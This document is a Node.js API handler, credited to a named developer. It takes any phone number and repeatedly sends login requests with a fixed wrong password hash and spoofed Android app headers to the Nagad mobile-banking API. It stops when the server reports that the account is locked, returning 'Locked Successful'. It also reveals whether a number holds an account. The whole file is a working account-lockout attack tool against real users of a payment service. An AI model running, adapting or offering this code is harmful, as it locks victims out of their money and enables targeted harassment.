const https = require("https");
const crypto = require("crypto");

module.exports = async (req, res) => {
  const { phone } = req.query;

  if (!phone) {
    return res.status(400).json({
      success: false,
      message: "Phone number is required.",
      credit: "Developer: Tofazzal Hossain"
    });
  }

  const url = "https://app2.mynagad.com:20002/api/login";

  const generateFGP = () => {
    return crypto.randomBytes(32).toString("hex").toUpperCase();
  };

  const baseHeaders = {
    "Host": "app2.mynagad.com:20002",
    "User-Agent": "okhttp/3.14.9",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
    "X-KM-UserId": "90617201",
    "X-KM-User-AspId": "100012345612345",
    "X-KM-User-Agent": "ANDROID/1170",
    "X-KM-Accept-language": "bn",
    "X-KM-AppCode": "01",
    "Cookie": "TS01e66e4e=01e006cfdc372dd0d9a364a1d897e7a0b29551a5c0c96e24375291a653cf7b04b009071bbba3e9ab6a49400e6d267a846f86a6ef91a2b78ba72b79b997bbd74a6b47468fc9"
  };

  const postData = JSON.stringify({
    aspId: "100012345612345",
    mpaId: null,
    password: "A20A2B7BB0842D5CF8A0C06C626421FD51EC103925C1819A51271F2779AFA730",
    username: phone
  });

  async function sendRequest() {
    return new Promise((resolve, reject) => {
      const headers = {
        ...baseHeaders,
        "X-KM-DEVICE-FGP": generateFGP()
      };

      const options = {
        method: "POST",
        headers
      };

      const request = https.request(url, options, (response) => {
        let data = "";
        response.on("data", (chunk) => data += chunk);
        response.on("end", () => resolve(data));
      });

      request.on("error", reject);
      request.write(postData);
      request.end();
    });
  }

  try {
    const firstResponse = await sendRequest();

    if (firstResponse.includes("একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে")) {
      return res.json({
        success: true,
        status: "Already Locked",
        credit: "Developer: Tofazzal Hossain"
      });
    }

    if (firstResponse.includes("আপনার কোন নগদ অ্যাকাউন্ট নেই")) {
      return res.json({
        success: false,
        status: "Invalid Nagad Number",
        credit: "Developer: Tofazzal Hossain"
      });
    }

    // Loop for 9 more tries
    for (let i = 0; i < 9; i++) {
      const response = await sendRequest();
      if (response.includes("একাধিকবার ভুল পিন দিয়ে চেষ্টা করার কারণে অ্যাকাউন্টটি লক করা হয়েছে")) {
        return res.json({
          success: true,
          status: "Locked Successful",
          credit: "Developer: Tofazzal Hossain"
        });
      }
    }

    return res.json({
      success: false,
      status: "Tried 10 times, but lock not detected.",
      credit: "Developer: Tofazzal Hossain"
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "Server Error: " + err.message,
      credit: "Developer: Tofazzal Hossain"
    });
  }
};
